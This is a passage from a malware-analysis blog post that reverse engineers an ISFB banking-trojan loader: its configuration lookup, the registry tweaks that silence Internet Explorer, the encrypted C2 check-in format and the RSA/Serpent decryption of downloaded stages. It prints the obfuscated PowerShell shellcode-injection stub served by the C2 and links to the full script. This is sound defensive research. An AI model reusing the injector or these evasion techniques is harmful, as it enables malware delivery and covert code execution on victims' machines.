<p>Looking at the assembly of the function, we can see the parsing function is quite simple. First, the loader checks to see if the value in <strong>some_counter</strong> is less than the number of entries in the configuration, which can be found as the first byte in the configuration &#8211; in this case it is <strong>0x0C</strong>, meaning there are 12 different values. It then looks at the DWORD pointed to by <strong>ecx-8</strong>, which in the first loop is only 8 bytes into the config. This DWORD is compared to the CS_COOKIE XOR value stored in <strong>xor_value</strong>. If these values don&#8217;t match, <strong>some_counter </strong>is incremented by 1, and <strong>24</strong> is added to <strong>ecx</strong>, before looping back around. If the values do match, the DWORD at <strong>ecx-4</strong> is used in a logical AND operation with the value 0x01. In this loader, each DWORD after the one compared to <strong>xor_value</strong> contains the value <strong>0x01</strong>, and as <strong>1 &amp; 1 = 1</strong>, the jump condition is never met. Therefore, the value of <strong>esi+ecx</strong> is moved into <strong>eax</strong>, and on the first loop, this is equal to <strong>0x78</strong>. The value in <strong>eax</strong> is then added to the offset pointed to by <strong>ecx</strong>, which on the first loop is <strong>0xF1</strong>, resulting in the value in <strong>eax</strong> being <strong>0x169</strong>. <strong>0x08 </strong>is added to this value, which is finally added to the base of the config in order to get the correct value.</p>



<p>To understand it better, you can see a psuedocode version below:</p>



<pre class="wp-block-code"><code>ESI =  0xFFFFFFF0 - Config_Address
ECX = Config_Address + 16
Counter = 0
CRC_Val = arg_0
while Counter &lt; Num_Config_Entries:
    Config_CRC = &#91;ECX-8]                # Point to config CRC val
    if Config_CRC== CRC_Val: 
       if &#91;ECX-4] &amp; 1 == 0:
            EAX = &#91;ECX]
        else:
            EAX = ESI + ECX
            EAX = EAX&#91;-8:]                    # Get Lower 8 bytes (32 bit machine)
            EAX = EAX + &#91;ECX]
            Pointer_To_Data = &#91;EAX +  Config_Address + 8]
Counter = Counter + 1
ECX = ECX + 24
if EAX &amp; EAX == 0:
    return Pointer_To_Data</code></pre>



<div class="wp-block-image"><figure class="aligncenter size-large"><img loading="lazy" decoding="async" width="872" height="940" src="https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_10.png" alt="" class="wp-image-4705" srcset="https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_10.png 872w, https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_10-600x647.png 600w, https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_10-278x300.png 278w, https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_10-768x828.png 768w, https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_10-720x776.png 720w" sizes="(max-width: 872px) 100vw, 872px" /></figure></div>



<p>Using the information in this function, we can understand how the configuration lookup part is constructed:</p>



<pre class="wp-block-code"><code>Config Lookup Structure (Typically followed by 3 DWORDs of 0x00's) {
    DWORD CRC_Name
    DWORD Flags
    DWORD Offset
}; 
Config Lookup Structure Example {
    0x655BEB58,
    0x00000001, 
    0x00000120
};</code></pre>



<p>Once the URLs have been located in the config, they are split into individual URLs for easier access &#8211; you&#8217;ll notice in the hex dump that each URL is split with 0x20, which corresponds to a space.</p>



<p>So, now we have looked at how the configuration works in ISFB and how it is parsed by the loader, we can move onto the next section/function &#8211; <strong>Network Communication and the Next Stage</strong>.</p>



<p><strong>Network Communication and the Next Stage</strong></p>



<p>Once the loader has finished with the config, it returns back to the previous function and calls the next one, which I have labelled <strong>Retrieve_And_Setup_Next_Stage </strong>(sub_1D76ED), and this function is where things start to become quite interesting with the usage of COM API to perform certain tasks. I have already gone over how the second loader utilizes COM to connect to it&#8217;s C2 server through Internet Explorer in a previous post, which you can find <strong><a href="https://www.0ffset.net/reverse-engineering/analyzing-com-mechanisms-in-malware/" target="_blank" rel="noreferrer noopener" aria-label="here (opens in a new tab)">here</a></strong>, and so I will only briefly touch on the COM API usage in the sample.</p>



<div class="wp-block-image"><figure class="aligncenter size-large"><img loading="lazy" decoding="async" width="875" height="588" src="https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_11.png" alt="" class="wp-image-4706" srcset="https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_11.png 875w, https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_11-600x403.png 600w, https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_11-300x202.png 300w, https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_11-768x516.png 768w, https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_11-720x484.png 720w" sizes="(max-width: 875px) 100vw, 875px" /></figure></div>



<p>Inside the <strong>Retrieve_And_Setup_Next_Stage </strong>function, there are 3 important functions, with the first one being named <strong>Registry_COM</strong> (sub_1D6E8A), the second being <strong>Talk_To_C2</strong> (sub_1D553A), and the final being <strong>Setup_And_Exec_Next_Stage</strong> (sub_1D79B1).</p>



<div class="wp-block-image"><figure class="aligncenter size-large"><img loading="lazy" decoding="async" width="820" height="854" src="https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_12.png" alt="" class="wp-image-4708" srcset="https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_12.png 820w, https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_12-600x625.png 600w, https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_12-288x300.png 288w, https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_12-768x800.png 768w, https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_12-720x750.png 720w" sizes="(max-width: 820px) 100vw, 820px" /></figure></div>



<p>As the name suggests, <strong>Registry_COM</strong> involves the loader interacting with the registry using COM API. When I was analyzing the sample, I noticed it would crash and get stuck on one of the COM calls, and it only seemed to work when running from the original executable, rather than the dumped DLL. The main purpose of this function is to prepare Internet Explorer before it is used to communicate to the C2 server. It does so by altering 3 registry keys:</p>



<pre class="wp-block-code"><code>SOFTWARE\Microsoft\Internet Explorer\Main\IE10RunOnceLastShown_TIMESTAMP
SOFTWARE\Microsoft\Internet Explorer\Main\IE8RunOnceLastShown_TIMESTAMP
SOFTWARE\Microsoft\Internet Explorer\Main\Check_Associations</code></pre>



<p>The first two are timestamps, which are altered using the result of <strong>GetSystemTimeAsFileTime()</strong>. This is to inform Internet Explorer that it was opened just a few seconds ago, so that it doesn&#8217;t pop up any unwanted message boxes that pop up every now and then. The final registry key is used to let Internet Explorer know if the user wants to see the &#8220;Internet Explorer isn&#8217;t your default browser&#8221; upon each restart. By default this is set to <strong>yes</strong>, but this loader sets it to <strong>no</strong>, so that the communication phase runs silently. If you are interested in learning more about how the sample uses COM for tasks like altering the registry, I highly recommend downloading it and analyzing it further, as there aren&#8217;t many resources out there focused on COM API in malware, and this is a great sample to learn from.</p>



<div class="wp-block-image"><figure class="aligncenter size-large"><img loading="lazy" decoding="async" width="824" height="935" src="https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_13.png" alt="" class="wp-image-4709" srcset="https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_13.png 824w, https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_13-600x681.png 600w, https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_13-264x300.png 264w, https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_13-768x871.png 768w, https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_13-720x817.png 720w" sizes="(max-width: 824px) 100vw, 824px" /></figure></div>



<p>Now we move onto the <strong>Talk_To_C2</strong> function. This function is comprised of two parts &#8211; a send/receive function (sub_1D43CC), and a decrypt/verify function (sub_1D6547). First, lets take a look at the send/receive function.</p>



<div class="wp-block-image"><figure class="aligncenter size-large"><img loading="lazy" decoding="async" width="734" height="943" src="https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_28.png" alt="" class="wp-image-4710" srcset="https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_28.png 734w, https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_28-600x771.png 600w, https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_28-234x300.png 234w, https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_28-720x925.png 720w" sizes="(max-width: 734px) 100vw, 734px" /></figure></div>



<p>Firstly, for each connection made to a command and control server, this loader edits a string that is posted to the server. This string contains information about the loader itself, as well as a GUID for the user. The reason I used the term &#8220;edit&#8221; is because the string that is used is stored inside the BSS section, although placeholders are used, rather than actual values. The string in question can be seen below:</p>



<pre class="wp-block-code"><code>soft=%u&amp;version=%u&amp;user=%08x%08x%08x%08x&amp;server=%u&amp;id=%u&amp;crc=%x&amp;uptime=%u</code></pre>



<p>The loader then uses <strong>wsprintf()</strong> to fill in the string, using the correct values. The <strong>soft</strong> and <strong>version</strong> are hardcoded into the loader, the <strong>user</strong> is the previously generated value, the <strong>server</strong> and <strong>id</strong> are taken from the configuration, the <strong>crc</strong> is taken from the result of a call to <strong>GetTickCount()</strong>, and the <strong>uptime</strong> is the result of a call to <strong>QueryPerformanceFrequency()</strong> and <strong>QueryPerformanceCounter()</strong>. Once all is complete, it should look similar to the string below:</p>



<pre class="wp-block-code"><code>soft=3&amp;version=214062&amp;user=8ab8bbedf455b2544c3b5e2514f9de84&amp;server=12&amp;id=3184&amp;crc=1&amp;uptime=6367</code></pre>



<div class="wp-block-image"><figure class="aligncenter size-large"><img loading="lazy" decoding="async" width="610" height="848" src="https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_15.png" alt="" class="wp-image-4711" srcset="https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_15.png 610w, https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_15-600x834.png 600w, https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_15-216x300.png 216w" sizes="(max-width: 610px) 100vw, 610px" /></figure></div>



<p>Next, the string is encrypted and encoded using Serpent CBC encryption and Base64 Encoding. The key used to encrypt it can be found in the configuration, and in this case the key is<strong> 10291029JSJUYNHG</strong>. Before doing so, a random string is prepended to the string so that there are no similarities in the data sent to different C2&#8217;s &#8211; this prevents analysts from writing rules to specifically search for the encrypted packet as it always differs. An example of a random string prepended can be seen below.</p>



<pre class="wp-block-code"><code>Decrypted + Decoded string:
phg=srlp&amp;soft=3&amp;version=214062&amp;user=8ab8bbedf455b2544c3b5e2514f9de84&amp;server=12&amp;id=3184&amp;crc=1&amp;uptime=6367
Encrypted + Encoded string:
i3J0eyZZBqiCnYVeSU5uAc0Wn9PO9cfNdjb7eSLG2GFV1SGx+Spn6KJ9qlLDRx6InJvmuN/hh376/+9SAqnsRrtozyV8MaAuXt1It1fou+wKQwZS4nXvzTRgwmeGj720+i8KGxZYeSuM2O+EE13JcV==</code></pre>



<div class="wp-block-image"><figure class="aligncenter size-large"><img loading="lazy" decoding="async" width="735" height="649" src="https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_16.png" alt="" class="wp-image-4712" srcset="https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_16.png 735w, https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_16-600x530.png 600w, https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_16-300x265.png 300w, https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_16-720x636.png 720w" sizes="(max-width: 735px) 100vw, 735px" /></figure></div>



<div class="wp-block-image"><figure class="aligncenter size-large"><img loading="lazy" decoding="async" width="769" height="349" src="https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_17.png" alt="" class="wp-image-4714" srcset="https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_17.png 769w, https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_17-600x272.png 600w, https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_17-300x136.png 300w, https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_17-720x327.png 720w" sizes="(max-width: 769px) 100vw, 769px" /></figure></div>



<p>To finalize the string before sending, the loader cleans it up a bit, removing values such as <strong>+ </strong>and <strong>/</strong> and replacing them with <strong>_2B</strong> and <strong>_2F</strong> respectively. The <strong>=</strong>&#8216;s are also removed. Finally, using the random value generator, it adds slashes to the string in random places, before prepending <strong>/images/</strong> and appending <strong>.avi</strong>, resulting in a string similar to the one below:</p>



<pre class="wp-block-code"><code>/images/i3J0eyZZBqiCnYVeSU5u/Ac0Wn9PO9cfNdjb7eSL/G2GFV1SGx_2BSpn6KJ9qlL/DRx6InJvmuN_2/Fhh376_2/F_2B9SAqnsRrtozyV8MaAuX/t1It1fou_2/BwKQwZS4nXvzTRgwm/eGj720_2Bi8K/GxZYeSuM2O_2BEE/13JcV.avi</code></pre>



<div class="wp-block-image"><figure class="aligncenter size-large"><img loading="lazy" decoding="async" width="552" height="648" src="https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_18.png" alt="" class="wp-image-4715" srcset="https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_18.png 552w, https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_18-256x300.png 256w" sizes="(max-width: 552px) 100vw, 552px" /></figure></div>



<p>Once the string is complete, it is appended to the URL, and then the sample uses COM functionality (sub_1D6F57) to communicate through Internet Explorer &#8211; so looking at Process Hacker, you will notice that Internet Explorer is making connections, even though it is not open &#8211; this is actually the loader connecting to the C2. If you want to find more about how it does this, check out a previous post <strong><a href="https://www.0ffset.net/reverse-engineering/analyzing-com-mechanisms-in-malware/" target="_blank" rel="noreferrer noopener" aria-label="here (opens in a new tab)">here</a></strong>.</p>



<div class="wp-block-image"><figure class="aligncenter size-large"><img loading="lazy" decoding="async" width="1024" height="715" src="https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_19-1024x715.png" alt="" class="wp-image-4716" srcset="https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_19-1024x715.png 1024w, https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_19-600x419.png 600w, https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_19-300x210.png 300w, https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_19-768x536.png 768w, https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_19-720x503.png 720w, https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_19.png 1031w" sizes="(max-width: 1024px) 100vw, 1024px" /></figure></div>



<p>Whilst the C2 servers are down and have been for a while, we are able to use tools such as InetSim to our advantage and replay the packets to the malware, meaning we can debug it completely, rather than the sample exiting after failing to retrieve the next stage. This is only possible if you have a valid PCAP though, and luckily I made sure to have Wireshark running while I analyzed it initially. Once the data has been received by the loader, the send/receive function Base64 decodes the data and returns, and if the data is valid, the decrypt/verify function is called, so let&#8217;s move into that.</p>



<div class="wp-block-image"><figure class="aligncenter size-large"><img loading="lazy" decoding="async" width="907" height="519" src="https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_20.png" alt="" class="wp-image-4717" srcset="https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_20.png 907w, https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_20-600x343.png 600w, https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_20-300x172.png 300w, https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_20-768x439.png 768w, https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_20-720x412.png 720w" sizes="(max-width: 907px) 100vw, 907px" /></figure></div>



<p>The decrypt/verify function is fairly simple to understand if you know what algorithms are being used. It is commonly known that ISFB utilizes Serpent CBC Encryption, and that is no different in this loader. However, what you may not realize is that there is another decryption function called before the data is decrypted with Serpent &#8211; this is because the data that is decrypted by the first function contains 3 important things; the MD5 hash of the decrypted data, the Serpent key used to decrypt the data, as well as the size of the data to decrypt (a lot of the data in the data received is simply junk code). Looking at the image below, you can probably guess that it has something to do with RSA. And you would be right! Before initiating the decryption of the downloaded data, the loader copies the joined RSA key to a different region of memory, which is then pushed as the last argument to the function <strong>RSA_Serpent_MD5_Data</strong> (sub_1D2C60). We can also determine that in some samples, the &#8220;on-board&#8221; RSA key is encrypted, as we can see the variable <strong>dword_1DB25C</strong> is being used in an if() statement, which performs a rotating XOR algorithm on the RSA key. In this sample, that isn&#8217;t the case, so let&#8217;s step into the <strong>RSA_Serpent_MD5_Data</strong> function.</p>



<div class="wp-block-image"><figure class="aligncenter size-large"><img loading="lazy" decoding="async" width="876" height="628" src="https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_21.png" alt="" class="wp-image-4718" srcset="https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_21.png 876w, https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_21-600x430.png 600w, https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_21-300x215.png 300w, https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_21-768x551.png 768w, https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_21-720x516.png 720w" sizes="(max-width: 876px) 100vw, 876px" /></figure></div>



<p>Examining the psuedocode of what seems to be the main decryption function, there are three main functions here. It is quite difficult to follow what actually happens, due to the layout of the code and the <strong>LABEL_xx</strong>, but here is a quick summary of what happens: First, <strong>RSA_Decrypt_Block</strong> (sub_1D5213) is called, and the fourth argument of this function tells us that the loader is only looking at the last 64 bytes of the data &#8211; <strong>v4</strong> is the pointer to the received data, and <strong>a1</strong> is the size of the data. Therefore, if the data is 4064 bytes long, the fourth argument would be <strong>v4[4000]</strong>. Once the last 64 bytes have been RSA decrypted, the loader extracts the serpent key for decryption, the size, and MD5 hash, before calling the <strong>Serpent</strong> (sub_1D52B4) function, with the last argument being <strong>0</strong>, indicating the data is to be decrypted. Once the data has been decrypted fully, <strong>MD5_Decrypted_Executable </strong>(sub_1D2419) is called, which calculates the MD5 of the decrypted data. From there, it compares each DWORD of both MD5 hashes, and as long as they both match, it will return successfully &#8211; otherwise it will clear the decrypted data from memory and return. </p>



<pre class="wp-block-code"><code>Last 64 bytes of data - Encrypted {
    0x8B, 0x2B, 0x4F, 0x6B, 0xD8, 0xEF, 0xE3, 0x6A, 0x84, 0x11, 0x85, 0xDB, 0xAD, 0x4D, 0x36, 0x51,
    0x33, 0xC9, 0xCC, 0xAA, 0xCD, 0xCA, 0x72, 0x98, 0xB6, 0x15, 0x19, 0x19, 0xB3, 0x64, 0x4C, 0x82,
    0xF1, 0x72, 0x50, 0x57, 0xAC, 0x1C, 0x43, 0x82, 0xAB, 0x82, 0xBB, 0x7A, 0xF8, 0xD1, 0x0D, 0xAF,
    0xF4, 0xDD, 0x40, 0x13, 0x85, 0x5E, 0xA2, 0xE1, 0x91, 0x88, 0xF6, 0xFA, 0x2B, 0xD5, 0xF2, 0x51
};

Last 64 bytes of data - RSA Decrypted - MD5&#91;0:16], Serpent&#91;16:32], Size&#91;32:36] {
    0x14, 0x37, 0x3F, 0x33, 0xE1, 0x90, 0x7B, 0x5D, 0x82, 0x74, 0x7B, 0xED, 0x1F, 0x1A, 0xAC, 0xAF,
    0xE2, 0xD9, 0x64, 0x73, 0x36, 0x1D, 0xD8, 0x57, 0xCA, 0xA1, 0x8C, 0x7B, 0x9E, 0x65, 0x80, 0xDF,
    0x00, 0x76, 0x02, 0x00, 0x06, 0xAD, 0x28, 0x67, 0x14, 0x37, 0x3F, 0x33, 0xE1, 0x90, 0x7B, 0x5D,
    0x82, 0x74, 0x7B, 0xED, 0x1F, 0x1A, 0xAC, 0xAF, 0x28, 0x00, 0x00, 0x00, 0x00, 0x76, 0x02, 0x00
};</code></pre>



<div class="wp-block-image"><figure class="aligncenter size-large"><img loading="lazy" decoding="async" width="1024" height="616" src="https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_22-1024x616.png" alt="" class="wp-image-4720" srcset="https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_22-1024x616.png 1024w, https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_22-600x361.png 600w, https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_22-300x180.png 300w, https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_22-768x462.png 768w, https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_22-720x433.png 720w, https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_22.png 1453w" sizes="(max-width: 1024px) 100vw, 1024px" /></figure></div>



<p>Now that the data has been decrypted, and the MD5 hashes match completely, the decrypt/verify function will return and overwrite the encrypted data with the decrypted data using <strong>memcpy()</strong>. Then, we return back to the function that called <strong>Talk_To_C2</strong>. It is quite difficult to tell with the psuedocode, but <strong>Talk_To_C2</strong> is actually inside a loop that loops 3 times in total, meaning the same C2 is queried 3 times, with the same data, and it might leave you questioning &#8220;why?&#8221;. Well to answer that, we need to look at what the encrypted data actually is. We can do this by decrypting it based off of the PCAP, or simply by debugging it and waiting for it to decrypt in memory, before dumping it out.</p>



<div class="wp-block-image"><figure class="aligncenter size-large"><img loading="lazy" decoding="async" width="1024" height="698" src="https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_23-1024x698.png" alt="" class="wp-image-4721" srcset="https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_23-1024x698.png 1024w, https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_23-600x409.png 600w, https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_23-300x205.png 300w, https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_23-768x524.png 768w, https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_23-720x491.png 720w, https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_23.png 1125w" sizes="(max-width: 1024px) 100vw, 1024px" /></figure></div>



<p>On the first and second call to <strong>Talk_To_C2</strong>, the C2 server returns an executable. It may seem like it is the same executable and the C2 just has an error, but on closer inspection this is not true &#8211; looking at both executables in HxD, we can see that one is for a 64 bit machine, and the other is for a 32 bit machine, which makes sense as ISFB injects into explorer.exe, so having the correct architecture would be useful. So, we know what the first two connections are for, what is the third?</p>



<div class="wp-block-image"><figure class="aligncenter size-large"><img loading="lazy" decoding="async" width="1024" height="559" src="https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_24-1024x559.png" alt="" class="wp-image-4722" srcset="https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_24-1024x559.png 1024w, https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_24-600x328.png 600w, https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_24-300x164.png 300w, https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_24-768x419.png 768w, https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_24-720x393.png 720w, https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_24.png 1496w" sizes="(max-width: 1024px) 100vw, 1024px" /></figure></div>



<p>If you&#8217;ve ever read anything about ISFB in depth, you might have heard that it uses Powershell and the registry for persistence. Well, this is the decrypted data returned by the C2 on the third and final connection:</p>



<pre class="wp-block-code"><code>$rpgsxgd="jgrtkahbulw";function vva{$sjoielxky=&#91;System.Convert]::FromBase64String($args&#91;0]);&#91;System.Text.Encoding]::ASCII.GetString($sjoielxky);};&#91;byte&#91;]]$gfhmenc=@(@CODE@);
iex(vva("DQokZXJ1bXN3c3dmaD0iW0RsbEltcG9ydChgImtlcm5lbDMyYCIpXWBucHVibGljIHN0YXRpYyBleHRlcm4gSW50UHRyIEdldEN1cnJlbnRQcm9jZXNzKCk7YG5bRGxsSW1wb3J0KGAia2VybmVsMzJgIildYG5wdWJsaWMgc3RhdGljIGV4dGVybiBJbnRQdHIgVmlydHVhbEFsbG9jRXgoSW50UHRyIG5hayxJbnRQdHIgZnF3cW5rYW1zdGwsdWludCBpd3MsdWludCB2d3Vpa2NkeSx1aW50IG5zaW10d2VkKTsiOyRqcHhsPUFkZC1UeXBlIC1tZW1iZXJEZWZpbml0aW9uICRlcnVtc3dzd2ZoIC1OYW1lICd5aWF2d3NzYmRiJyAtbmFtZXNwYWNlIFdpbjMyRnVuY3Rpb25zIC1wYXNzdGhydTsNCiRqeGZhbW94d2d5bT0iW0RsbEltcG9ydChgImtlcm5lbDMyYCIpXWBucHVibGljIHN0YXRpYyBleHRlcm4gSW50UHRyIEdldEN1cnJlbnRUaHJlYWRJZCgpO2BuW0RsbEltcG9ydChgImtlcm5lbDMyYCIpXWBucHVibGljIHN0YXRpYyBleHRlcm4gdWludCBRdWV1ZVVzZXJBUEMoSW50UHRyIGhzdWFocSxJbnRQdHIgZG9kY2NreWZncCxJbnRQdHIgb29hY24pO2BuW0RsbEltcG9ydChgImtlcm5lbDMyYCIpXWBucHVibGljIHN0YXRpYyBleHRlcm4gSW50UHRyIE9wZW5UaHJlYWQodWludCBoamtlLHVpbnQgYXFoaGksSW50UHRyIG5kandzKTtgbltEbGxJbXBvcnQoYCJrZXJuZWwzMmAiKV1gbnB1YmxpYyBzdGF0aWMgZXh0ZXJuIHZvaWQgU2xlZXBFeCh1aW50IHl4b2lkZXJxLHVpbnQgY25lcWh0KTsiOyRwYmNtPUFkZC1UeXBlIC1tZW1iZXJEZWZpbml0aW9uICRqeGZhbW94d2d5bSAtTmFtZSAnZWNkZGMnIC1uYW1lc3BhY2UgV2luMzJGdW5jdGlvbnMgLXBhc3N0aHJ1Ow0KaWYoJHdrcWVqanVra3ZqPSRqcHhsOjpWaXJ0dWFsQWxsb2NFeCgkanB4bDo6R2V0Q3VycmVudFByb2Nlc3MoKSwwLCRnZmhtZW5jLkxlbmd0aCwxMjI4OCw2NCkpe1tTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkNvcHkoJGdmaG1lbmMsMCwkd2txZWpqdWtrdmosJGdmaG1lbmMubGVuZ3RoKTtpZigkcGJjbTo6UXVldWVVc2VyQVBDKCR3a3Flamp1a2t2aiwkcGJjbTo6T3BlblRocmVhZCgxNiwwLCRwYmNtOjpHZXRDdXJyZW50VGhyZWFkSWQoKSksJHdrcWVqanVra3ZqKSl7JHBiY206OlNsZWVwRXgoMjAsMSk7fX0NCn=="));</code></pre>



<p>After cleaning this up a bit and decoding the Base64, we get this:</p>



<div class="wp-block-image"><figure class="aligncenter size-large"><img loading="lazy" decoding="async" width="1024" height="333" src="https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_25-1024x333.png" alt="" class="wp-image-4723" srcset="https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_25-1024x333.png 1024w, https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_25-600x195.png 600w, https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_25-300x98.png 300w, https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_25-768x250.png 768w, https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_25-720x234.png 720w, https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_25.png 1215w" sizes="(max-width: 1024px) 100vw, 1024px" /></figure></div>



<p>It does look quite confusing to start of with, but don&#8217;t worry, we will get into this when it is actually used by the sample. Once the communication phase is complete, the loader moves into the final function in the loader itself before exiting &#8211; <strong>Setup_And_Exec_Next_Stage</strong> (sub_1D79B1).</p>



<p><strong>Setting Up and Executing the Next Stage</strong></p>



<p>As mentioned previously, the ISFB loader utilizes the registry quite frequently, to store different pieces of data. Using the random value generator discussed earlier, as well as using file data from the System32 directory (the loader queries several different files, gathering file times etc.), the loader generates two seemingly random names based on filenames in the System32 folder, which are then used as registry key names. In this sample, the two generated names are <strong>basegcfg</strong> and <strong>ApiMider</strong>. Then, the loader copies one of the executables (depending on the system architecture) to a new region of memory,  before overwriting both executables (not the copied one) using a similar rotating XOR algorithm that was seen previously. From there, we move into quite an interesting function, called <strong>Convert_EXE_Input_Powershell</strong> (sub_1D5DBC).</p>



<div class="wp-block-image"><figure class="aligncenter size-large"><img loading="lazy" decoding="async" width="1024" height="881" src="https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_26-1024x881.png" alt="" class="wp-image-4725" srcset="https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_26-1024x881.png 1024w, https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_26-600x516.png 600w, https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_26-300x258.png 300w, https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_26-768x661.png 768w, https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_26-720x620.png 720w, https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_26.png 1070w" sizes="(max-width: 1024px) 100vw, 1024px" /></figure></div>



<p>This function is responsible for firstly converting each byte of the copied executable to an integer, as well as altering the first DWORD of the executable to a value that seems like a relative jump to an offset:</p>



<pre class="wp-block-code"><code>First DWORD of executable {
    0xE9, 0x2F, 0xA8, 0x01        # 0xE9 = Relative JMP in x86 ASM, JMP 0x1a82f?
};</code></pre>



<div class="wp-block-image"><figure class="aligncenter size-large"><img loading="lazy" decoding="async" width="734" height="943" src="https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_28-1.png" alt="" class="wp-image-4726" srcset="https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_28-1.png 734w, https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_28-1-600x771.png 600w, https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_28-1-234x300.png 234w, https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_28-1-720x925.png 720w" sizes="(max-width: 734px) 100vw, 734px" /></figure></div>



<p>As the executable is executed in an unusual way, this could be a pointer to the entry point of the executable, although interestingly, upon altering the entry point to said offset using PE-Bear and opening it up in IDA, it just points to the end of a function, so perhaps I am incorrect. Once the executable has been completely converted to integers, the loader then embeds this inside the powershell command we saw earlier. Searching for the string <strong>@CODE@</strong>, it replaces this with the converted executable. An example can be seen <strong><a rel="noreferrer noopener" aria-label=" (opens in a new tab)" href="https://zerobin.net/?98c1d31c65e47a19#zhJB1rGHOxf808MGfxfzockS9zn0EYw2xSbNJ1VtNug=" target="_blank">here</a></strong>, as it is an extremely long script after adding the executable in, so it would take up a lot of space.</p>



